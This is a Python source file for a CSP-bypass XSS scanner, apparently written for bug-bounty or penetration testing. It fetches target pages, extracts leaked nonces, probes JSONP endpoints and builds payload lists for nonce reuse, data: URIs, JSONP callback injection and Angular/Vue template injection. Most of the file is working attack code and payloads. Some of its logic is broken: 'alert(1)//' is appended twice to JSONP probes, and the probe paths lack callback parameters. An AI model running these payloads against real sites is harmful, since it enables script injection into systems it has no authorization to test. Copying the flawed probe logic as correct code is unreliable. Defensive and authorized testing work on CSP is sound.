"""CSP bypass techniques — nonce bypass, static nonce, data: URI, JSONP endpoints."""

from __future__ import annotations

import re
from dataclasses import dataclass, field

import httpx


# JSONP endpoints that load attacker-controlled JS (bypass script-src)
JSONP_CALLBACK_PAYLOADS = [
    "alert(document.domain)//",            # callback=alert(document.domain)//
    "alert(1)//",
    ")%3balert(1)//",                       # closes JSONP wrapper: callback=x);alert(1)//
]

# data: URI — works when script-src allows data: or unsafe-inline
DATA_URI_PAYLOADS = [
    "data:text/html,<script>alert(document.domain)</script>",
    "data:text/html;base64,PHNjcmlwdD5hbGVydChkb2N1bWVudC5kb21haW4pPC9zY3JpcHQ+",
]

# Common JSONP endpoints found on target/CDN origins
COMMON_JSONP_PATHS = [
    "/api/jsonp", "/jsonp", "/callback", "/api/callback",
    "/search?callback=", "/user?callback=",
]

NONCE_BYPASS_TEMPLATE = '<script nonce="{nonce}">alert(document.domain)</script>'

TEMPLATE_INJECTION_PAYLOADS = [
    "{{constructor.constructor('alert(1)')()}}",      # Angular 1.x
    "${alert(1)}",                                    # Vue template literal
]

_NONCE_PATTERN = re.compile(r"nonce-([a-zA-Z0-9+/=]+)", re.I)
_CSP_HEADER = re.compile(r"content-security-policy", re.I)


@dataclass
class CSPPolicy:
    raw: str
    has_nonce: bool
    nonce_value: str
    allows_unsafe_inline: bool
    allows_data_uri: bool
    jsonp_endpoints: list[str] = field(default_factory=list)


@dataclass
class CSPFinding:
    type: str = "csp_bypass"
    url: str = ""
    technique: str = ""
    payload: str = ""
    csp_raw: str = ""
    evidence: str = ""
    severity: str = "P2"


class CSPBypass:
    """Analyses CSP headers and generates targeted bypass payloads."""

    def __init__(self, session: httpx.Client | None = None):
        self.session = session or httpx.Client(timeout=20, follow_redirects=True)

    def analyse(self, url: str) -> CSPPolicy | None:
        try:
            resp = self.session.get(url)
        except Exception:
            return None
        csp_raw = ""
        for hdr, val in resp.headers.items():
            if _CSP_HEADER.match(hdr):
                csp_raw = val
                break
        if not csp_raw:
            # Check meta tag
            m = re.search(r'<meta[^>]+content-security-policy[^>]+content=["\']([^"\']+)', resp.text, re.I)
            csp_raw = m.group(1) if m else ""

        nonce_m = _NONCE_PATTERN.search(csp_raw)
        return CSPPolicy(
            raw=csp_raw,
            has_nonce=bool(nonce_m),
            nonce_value=nonce_m.group(1) if nonce_m else "",
            allows_unsafe_inline="unsafe-inline" in csp_raw,
            allows_data_uri="data:" in csp_raw,
        )

    def extract_dom_nonce(self, html: str) -> str | None:
        """Extract nonce attribute from existing script tags in the page."""
        m = re.search(r'<script[^>]+nonce=["\']?([^"\'>\s]+)', html, re.I)
        return m.group(1) if m else None

    def find_jsonp_endpoints(self, base_url: str) -> list[str]:
        """Probe common JSONP paths and return responsive ones."""
        found = []
        for path in COMMON_JSONP_PATHS:
            probe = base_url.rstrip("/") + path + "alert(1)//"
            try:
                resp = self.session.get(probe, timeout=5)
                if "alert(1)" in resp.text:
                    found.append(probe)
            except Exception:
                pass
        return found

    def scan(self, url: str) -> list[CSPFinding]:
        policy = self.analyse(url)
        findings: list[CSPFinding] = []
        if policy is None:
            return findings

        # Static / leaked nonce
        try:
            html = self.session.get(url).text
        except Exception:
            html = ""
        dom_nonce = self.extract_dom_nonce(html)
        if dom_nonce:
            payload = NONCE_BYPASS_TEMPLATE.format(nonce=dom_nonce)
            findings.append(CSPFinding(
                url=url, technique="static_nonce", payload=payload,
                csp_raw=policy.raw, evidence=f"nonce={dom_nonce}",
            ))

        # data: URI bypass
        if policy.allows_data_uri:
            for p in DATA_URI_PAYLOADS:
                findings.append(CSPFinding(
                    url=url, technique="data_uri", payload=p, csp_raw=policy.raw,
                ))

        # JSONP bypass
        for ep in self.find_jsonp_endpoints(url):
            findings.append(CSPFinding(
                url=url, technique="jsonp", payload=ep + "alert(1)//", csp_raw=policy.raw,
            ))

        # Angular template injection (if no nonce restriction on allowed CDN)
        if not policy.has_nonce:
            for p in TEMPLATE_INJECTION_PAYLOADS:
                findings.append(CSPFinding(
                    url=url, technique="template_injection", payload=p, csp_raw=policy.raw,
                ))

        return findings
